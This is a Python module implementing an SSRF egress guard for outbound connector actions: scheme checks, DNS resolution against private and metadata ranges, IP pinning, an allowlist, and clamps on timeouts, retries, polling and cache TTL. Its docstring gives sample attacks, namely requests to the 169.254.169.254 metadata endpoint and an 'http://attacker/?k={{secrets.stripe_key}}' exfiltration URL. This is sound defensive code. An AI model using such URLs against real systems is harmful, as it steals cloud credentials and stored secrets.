"""SSRF egress guard for outbound connector actions.

The action path (executor._fire_action_request) resolves {{secrets.*}} into the URL, headers and
body and then makes the request with NO host check at all. That is a double-barrelled SSRF: an
untrusted author can point an action at the cloud metadata endpoint (169.254.169.254) to steal
the instance's IAM role, or at http://attacker/?k={{secrets.stripe_key}} to exfiltrate a stored
secret. The only guard that existed lived on /actions/test -- which deliberately does NOT inject
stored secrets -- so it protected the harmless path and left the dangerous one open.

This is a denylist done right, plus optional allowlisting:

  * scheme must be http/https (no file://, gopher://, etc.);
  * the host is RESOLVED and every resulting IP is checked against private/loopback/link-local/
    reserved/multicast/unspecified ranges. Resolving is what a string blocklist cannot do -- it
    catches 127.1, the integer form 2130706433, 0x7f.1, IPv6-mapped ::ffff:169.254.169.254, and
    a public name that resolves to a private A record;
  * the vetted IP is PINNED for the actual connection (see build_pinned_request), so a DNS
    rebind between the check and the connect cannot swing the target to a private address;
  * an optional allowlist (RULEMIND_ACTION_ALLOWED_HOSTS) turns this into deny-by-default.

Redirects are handled by the caller disabling redirect-following, so a 302 to metadata is never
chased.
"""
from __future__ import annotations

import ipaddress
import os
import socket
from dataclasses import dataclass
from typing import List, Optional
from urllib.parse import urlparse, urlunparse

from . import env

__all__ = ["EgressBlocked", "PinnedRequest", "build_pinned_request", "vet_url"]


class EgressBlocked(Exception):
    """The target URL failed the SSRF guard. Carries a caller-safe reason.

    `reason` is a machine-readable code, because callers need to tell two very different
    situations apart and were doing it by substring-matching the message:

      * "the policy refused this target" is the CALLER'S fault -- a misconfiguration, 4xx.
      * "DNS did not resolve" is a fact about the world -- the probe ran and the host is not
        there, which is a successful probe reporting a failure, 200.

    Both arrive as this one exception type. Matching on wording made a reworded message
    silently reclassify every unresolvable host as a configuration error.
    """

    # Policy said no: scheme, allowlist, or a non-public address.
    REASON_POLICY = "policy"
    # The name did not resolve. Not a policy decision.
    REASON_DNS = "dns"

    def __init__(self, message: str, reason: str = "policy") -> None:
        super().__init__(message)
        self.reason = reason


@dataclass
class PinnedRequest:
    url: str          # the URL to actually connect to, host replaced by the vetted IP
    host_header: str  # the Host header value (original host[:port])
    sni_hostname: str # SNI + cert-verification name for TLS (the original host)
    original_url: str


def _allowlist() -> Optional[set]:
    raw = os.getenv("RULEMIND_ACTION_ALLOWED_HOSTS", "").strip()
    if not raw:
        return None  # no allowlist configured -> fall back to the range denylist below
    return {h.strip().lower() for h in raw.split(",") if h.strip()}


def _is_public(ip_text: str) -> bool:
    ip = ipaddress.ip_address(ip_text)
    # An IPv4-mapped IPv6 address (::ffff:127.0.0.1) is classified on its embedded v4 address --
    # ipaddress does not treat the mapped form as loopback/private on its own.
    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
        ip = ip.ipv4_mapped
    return not (
        ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
        or ip.is_multicast or ip.is_unspecified
    )


def _resolve(host: str, port: int) -> List[str]:
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise EgressBlocked(
            "DNS resolution failed for {0}".format(host), reason=EgressBlocked.REASON_DNS) from exc
    ips: List[str] = []
    for info in infos:
        addr = str(info[4][0])
        if addr not in ips:
            ips.append(addr)
    if not ips:
        raise EgressBlocked(
            "host {0} did not resolve".format(host), reason=EgressBlocked.REASON_DNS)
    return ips


def vet_url(url: str) -> str:
    """Validate a URL against the SSRF policy and return the single vetted IP to connect to.

    Raises EgressBlocked with a caller-safe reason on any failure.
    """
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise EgressBlocked("only http/https action URLs are allowed")
    host = parsed.hostname
    if not host:
        raise EgressBlocked("action URL has no host")

    allow = _allowlist()
    if allow is not None and host.lower() not in allow:
        raise EgressBlocked("host {0} is not in the action allowlist".format(host))

    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    ips = _resolve(host, port)
    for ip in ips:
        if not _is_public(ip):
            # Every resolved address must be public: a host resolving to even one internal IP is
            # refused, so a name with mixed records can't be used to sneak in.
            raise EgressBlocked("{0} resolves to non-public address {1}".format(host, ip))
    return ips[0]


def build_pinned_request(url: str) -> PinnedRequest:
    """Vet `url` and return a PinnedRequest that connects to the vetted IP.

    Connecting to the IP (not the name) closes the DNS-rebinding window: the address is resolved
    and checked ONCE, and that same address is what the socket connects to. The Host header and
    TLS SNI keep the original hostname so virtual hosting and certificate verification still work.
    """
    vetted_ip = vet_url(url)
    parsed = urlparse(url)
    host = parsed.hostname or ""
    # Bracket IPv6 literals in the netloc.
    ip_netloc = "[{0}]".format(vetted_ip) if ":" in vetted_ip else vetted_ip
    if parsed.port:
        ip_netloc = "{0}:{1}".format(ip_netloc, parsed.port)
    pinned_url = urlunparse(parsed._replace(netloc=ip_netloc))
    host_header = host if not parsed.port else "{0}:{1}".format(host, parsed.port)
    return PinnedRequest(url=pinned_url, host_header=host_header, sni_hostname=host, original_url=url)


# Clamps for author-supplied action tunables. Unclamped, one action could be
# timeoutMs=600000 x retries=10 -- a 100-minute request holding a worker.
MAX_TIMEOUT_MS = env.env_int("RULEMIND_ACTION_MAX_TIMEOUT_MS", 30000)
MAX_RETRIES = env.env_int("RULEMIND_ACTION_MAX_RETRIES", 5)


def clamp_timeout_ms(value: object) -> int:
    try:
        ms = int(value)  # type: ignore[call-overload]
    except (TypeError, ValueError):
        return 5000
    return max(1, min(ms, MAX_TIMEOUT_MS))


def clamp_retries(value: object) -> int:
    try:
        n = int(value)  # type: ignore[call-overload]
    except (TypeError, ValueError):
        return 0
    return max(0, min(n, MAX_RETRIES))


# Polling reuses the same argument as the two clamps above, and needs it more. A poll is a loop
# whose exit condition is controlled by the REMOTE side: `maxPolls x pollIntervalMs` is time this
# server spends sleeping while a provider decides whether to answer, and an author who writes
# maxPolls=1000, pollIntervalMs=60000 has asked for a 16-hour step. The evaluation budget bounds
# it too (executor._poll_action checks the deadline before every attempt and clamps the sleep to
# what is left), but the budget is per-tenant configuration and can itself be raised, so the
# platform ceiling lives here where a tenant cannot move it.
MAX_POLLS = env.env_int("RULEMIND_ACTION_MAX_POLLS", 10)
MAX_POLL_INTERVAL_MS = env.env_int("RULEMIND_ACTION_MAX_POLL_INTERVAL_MS", 10000)


def clamp_polls(value: object) -> int:
    """Attempts, not retries: 1 means fire once and evaluate the condition once.

    Floored at 1 rather than 0, because a poll step that never fires its request is not a
    degraded poll -- it is a step that silently did nothing while reporting a result, which is
    the failure mode the whole fail-closed contract exists to prevent.
    """
    try:
        n = int(value)  # type: ignore[call-overload]
    except (TypeError, ValueError):
        return 3
    return max(1, min(n, MAX_POLLS))


def clamp_poll_interval_ms(value: object) -> int:
    try:
        ms = int(value)  # type: ignore[call-overload]
    except (TypeError, ValueError):
        return 1000
    return max(0, min(ms, MAX_POLL_INTERVAL_MS))


# Decision-time source fetching (connector_fetch) caches a downstream's response for a
# connector-configured TTL. The ceiling lives here, next to the other clamps, for the same
# reason MAX_POLLS does: the evaluation budget is per-tenant configuration and a tenant can
# raise it, so the platform bound must sit somewhere a tenant cannot move. What is bounded here
# is STALENESS -- how old the bureau/KYC data behind a decision is allowed to be.
MAX_CACHE_TTL_MS = env.env_int("RULEMIND_CONNECTOR_MAX_CACHE_TTL_MS", 300000)


def clamp_cache_ttl_ms(value: object) -> int:
    """0 means "do not cache", and that is where an unreadable value lands.

    Unlike the timeout clamp, garbage does NOT fall back to a working default: a typo in a TTL
    must not silently authorise serving a decision on a response that was pulled for a different
    request minutes ago. Not caching is always correct; caching for an accidental duration is
    not.
    """
    try:
        ms = int(value)  # type: ignore[call-overload]
    except (TypeError, ValueError):
        return 0
    return max(0, min(ms, MAX_CACHE_TTL_MS))
